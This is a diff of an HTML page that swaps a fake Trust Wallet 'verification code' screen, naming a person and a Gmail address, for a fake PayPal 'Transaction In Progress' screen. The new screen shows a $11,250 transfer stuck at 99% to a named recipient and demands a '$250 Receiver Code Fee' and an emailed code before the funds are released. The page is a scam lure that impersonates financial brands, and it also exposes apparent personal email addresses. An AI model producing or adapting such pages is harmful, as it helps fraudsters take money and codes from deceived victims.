@@ -3,116 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter Verification Code - Trust Wallet</title>
+    <title>Transaction In Progress - PayPal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Trust Wallet color scheme */
-        :root {
-            --trust-blue: #0052ff;
-            --trust-dark: #0c0f24;
-            --trust-card: #1a1d35;
-            --trust-light: #2a2e4d;
+        /* Clamp for responsive header text */
+        .responsive-header {
+            font-size: clamp(1.5rem, 4vw, 2rem);
         }
         
-        body {
-            background-color: var(--trust-dark);
+        /* Highlight for recipient message */
+        .highlight-message {
+            background-color: #fef3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px 16px;
+            border-radius: 0 8px 8px 0;
         }
         
-        .trust-card {
-            background-color: var(--trust-card);
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        /* Progress container and boxes */
+        .progress-container {
+            display: flex;
+            width: 100%;
+            gap: 4px;
+            margin-bottom: 12px;
         }
         
-        .trust-button {
-            background-color: var(--trust-blue);
-            border-radius: 12px;
-            transition: all 0.3s ease;
+        .progress-box {
+            height: 8px;
+            flex: 1;
+            background-color: #e5e7eb;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
         }
         
-        .trust-button:hover {
-            background-color: #0046d9;
-            transform: translateY(-2px);
-        }
-        
-        .trust-secondary {
-            background-color: var(--trust-light);
-            border-radius: 12px;
-            transition: all 0.3s ease;
-        }
-        
-        .trust-secondary:hover {
-            background-color: #34385c;
+        .progress-box.active {
+            background-color: #0070ba;
         }
         
         /* Code input styling */
         .code-input-container {
             display: flex;
             justify-content: center;
-            gap: 8px;
-            margin-bottom: 10px;
+            gap: 10px;
+            margin-bottom: 20px;
         }
         
         .code-input {
-            width: 40px;
-            height: 50px;
+            width: 50px;
+            height: 60px;
             text-align: center;
-            font-size: 18px;
+            font-size: 24px;
             font-weight: bold;
-            border: 2px solid #2a2e4d;
+            border: 2px solid #d1d5db;
             border-radius: 8px;
-            background-color: #0c0f24;
-            color: white;
+            background-color: #f9fafb;
             transition: all 0.2s ease;
         }
         
         .code-input:focus {
-            border-color: var(--trust-blue);
-            background-color: #1a1d35;
+            border-color: #0070ba;
+            background-color: white;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.2);
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
         }
         
-        /* Progress bar */
-        .custom-progress {
-            height: 6px;
-            background-color: #2a2e4d;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 8px;
+        /* Animated progress bar */
+        .animated-progress {
+            height: 8px;
+            background: linear-gradient(90deg, #0070ba 0%, #0070ba 50%, transparent 50%, transparent 100%);
+            background-size: 200% 100%;
+            border-radius: 4px;
+            animation: loading 2s infinite linear;
         }
         
-        .custom-progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--trust-blue), #3375ff);
-            width: 91%;
-            transition: width 0.5s ease;
-        }
-        
-        /* Responsive adjustments */
-        @media (max-width: 480px) {
-            .code-input {
-                width: 36px;
-                height: 46px;
-                font-size: 16px;
+        @keyframes loading {
+            0% {
+                background-position: 100% 0;
             }
-            
-            .code-input-container {
-                gap: 6px;
+            100% {
+                background-position: -100% 0;
             }
         }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4">
-    <div class="max-w-md w-full trust-card overflow-hidden">
+<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full bg-white rounded-xl shadow-lg overflow-hidden">
         <!-- Header -->
-        <div class="py-5 px-6 border-b border-[#2a2e4d]">
-            <div class="flex items-center justify-center">
-                <div class="w-12 h-12 rounded-full bg-gradient-to-r from-[#0052ff] to-[#3375ff] flex items-center justify-center mr-3">
-                    <i class="fas fa-wallet text-white text-xl"></i>
+        <div class="bg-[#0070ba] py-4 px-6">
+            <div class="flex items-center">
+                <div class="w-10 h-10 rounded-full bg-white flex items-center justify-center mr-3">
+                    <i class="fab fa-paypal text-[#0070ba] text-xl"></i>
                 </div>
-                <h1 class="text-white text-xl font-bold">Trust Wallet</h1>
+                <h1 class="text-white text-xl font-bold"></h1>
             </div>
         </div>
         
@@ -120,86 +102,84 @@
         <div class="p-6">
             <!-- Status Icon -->
             <div class="flex justify-center mb-6">
-                <div class="w-20 h-20 rounded-full bg-gradient-to-r from-[#0052ff] to-[#3375ff] flex items-center justify-center">
-                    <i class="fas fa-shield-alt text-white text-3xl"></i>
+                <div class="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center">
+                    <i class="fas fa-sync-alt text-[#0070ba] text-3xl"></i>
                 </div>
             </div>
             
             <!-- Status Text -->
-            <h2 class="text-white font-bold text-center text-xl mb-4">Enter Verification Code</h2>
+            <h2 class="responsive-header font-bold text-center text-gray-800 mb-4">Transaction In Progress</h2>
             
-            <!-- User Information -->
-            <div class="mb-4">
-                <small class="text-gray-400 text-sm">Verification for</small>
-                <div class="mt-1">
-                    <small class="text-gray-300">lisa touchstone</small>
-                    <small class="text-gray-400 mx-2">•</small>
-                    <small class="text-gray-300">lisatouchstone123@gmail.com</small>
+                        <!-- Highlighted Message -->
+            <div class="highlight-message mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-info-circle text-amber-500 mt-0.5 mr-2 flex-shrink-0"></i>
+                    <p class="text-amber-800 text-sm sm:text-base">
+                        A <span class="font-semibold">$250 Receiver Code Fee</span> is required to finalize the release of the funds to recipient PayPal balance.
+                    </p>
                 </div>
-            </div>
-            
-            <!-- Progress Bar -->
-            <div class="mb-6">
-                <div class="custom-progress">
-                    <div class="custom-progress-fill"></div>
-                </div>
-                <p class="text-center text-gray-400 text-sm">Verification progress (91%)</p>
             </div>
             
             <!-- Code Input Section -->
             <div class="mb-6">
-                <p class="text-center text-gray-300 mb-4">Enter the 14-digit code sent to your email</p>
-                
-                <!-- First row of 7 boxes -->
+                <p class="text-center text-gray-700 mb-3">Enter the 4-digit code sent to your email</p>
                 <div class="code-input-container">
                     <input type="text" maxlength="1" class="code-input" id="digit1">
                     <input type="text" maxlength="1" class="code-input" id="digit2">
                     <input type="text" maxlength="1" class="code-input" id="digit3">
                     <input type="text" maxlength="1" class="code-input" id="digit4">
-                    <input type="text" maxlength="1" class="code-input" id="digit5">
-                    <input type="text" maxlength="1" class="code-input" id="digit6">
-                    <input type="text" maxlength="1" class="code-input" id="digit7">
-                </div>
-                
-                <!-- Second row of 7 boxes -->
-                <div class="code-input-container">
-                    <input type="text" maxlength="1" class="code-input" id="digit8">
-                    <input type="text" maxlength="1" class="code-input" id="digit9">
-                    <input type="text" maxlength="1" class="code-input" id="digit10">
-                    <input type="text" maxlength="1" class="code-input" id="digit11">
-                    <input type="text" maxlength="1" class="code-input" id="digit12">
-                    <input type="text" maxlength="1" class="code-input" id="digit13">
-                    <input type="text" maxlength="1" class="code-input" id="digit14">
                 </div>
             </div>
             
-            <!-- Simple Instruction -->
-            <div class="bg-[#2a2e4d] rounded-lg p-4 mb-6">
-                <p class="text-gray-300 text-sm text-center">
-                    Please enter the complete 14-digit verification code to proceed
-                </p>
+            <!-- Progress Bar -->
+            <div class="mb-8">
+                <div class="animated-progress mb-2"></div>
+                <p class="text-center text-gray-500 text-sm">Processing transaction... (99%)</p>
+            </div>
+            
+            <!-- Transaction Details -->
+            <div class="bg-gray-50 rounded-lg p-4 mb-6">
+                <h3 class="font-semibold text-gray-700 mb-3">Transaction Details</h3>
+                <div class="space-y-2">
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Amount:</span>
+                        <span class="font-medium">$11,250.00 USD</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Recipient:</span>
+                        <span class="font-medium">giambrunoamy@gmail.com</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Date:</span>
+                        <span class="font-medium">Oct 29, 2025</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Transaction ID:</span>
+                        <span class="font-medium">TX-7842-5691</span>
+                    </div>
+                </div>
             </div>
             
             <!-- Action Buttons -->
             <div class="space-y-3">
-                <button class="w-full trust-button text-white font-medium py-3 px-4 rounded-lg">
-                    Verify Code
+                <button class="w-full bg-[#0070ba] hover:bg-[#005ea6] text-white font-medium py-3 px-4 rounded-lg transition duration-200">
+                    Processing ...
                 </button>
 
             </div>
             
             <!-- Help Text -->
             <p class="text-center text-gray-500 text-sm mt-6">
-                Need help? <a href="#" class="text-[#3375ff] hover:underline">Contact Support</a>
+                Need help? <a href="#" class="text-[#0070ba] hover:underline">Visit our Help Center</a>
             </p>
         </div>
         
         <!-- Footer -->
-        <div class="py-4 px-6 border-t border-[#2a2e4d]">
+        <div class="bg-gray-100 py-4 px-6 border-t border-gray-200">
             <div class="flex justify-center space-x-6 text-gray-500 text-sm">
-                <a href="#" class="hover:text-[#3375ff]">Privacy</a>
-                <a href="#" class="hover:text-[#3375ff]">Terms</a>
-                <a href="#" class="hover:text-[#3375ff]">Support</a>
+                <a href="#" class="hover:text-[#0070ba]">Privacy</a>
+                <a href="#" class="hover:text-[#0070ba]">Legal</a>
+                <a href="#" class="hover:text-[#0070ba]">Feedback</a>
             </div>
         </div>
     </div>
@@ -217,9 +197,6 @@
                 
                 // Handle input
                 input.addEventListener('input', function(e) {
-                    // Only allow numeric input
-                    this.value = this.value.replace(/[^0-9]/g, '');
-                    
                     if (this.value.length === 1) {
                         if (index < inputs.length - 1) {
                             inputs[index + 1].focus();
@@ -235,41 +212,6 @@
                         }
                     }
                 });
-                
-                // Handle paste event for the entire code
-                input.addEventListener('paste', function(e) {
-                    e.preventDefault();
-                    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
-                    
-                    if (pasteData.length === 14) {
-                        for (let i = 0; i < 14; i++) {
-                            if (inputs[i]) {
-                                inputs[i].value = pasteData[i] || '';
-                            }
-                        }
-                        inputs[13].focus();
-                    }
-                });
-            });
-            
-            // Submit button functionality
-            document.querySelector('.trust-button').addEventListener('click', function() {
-                let code = '';
-                inputs.forEach(input => {
-                    code += input.value;
-                });
-                
-                if (code.length === 14) {
-                    alert('Code submitted: ' + code);
-                    // In a real application, you would submit the code to the server here
-                } else {
-                    alert('Please enter the complete 14-digit code');
-                }
-            });
-            
-            // Resend code button functionality
-            document.querySelector('.trust-secondary').addEventListener('click', function() {
-                alert('A new verification code has been sent to your email');
             });
         });
     </script>
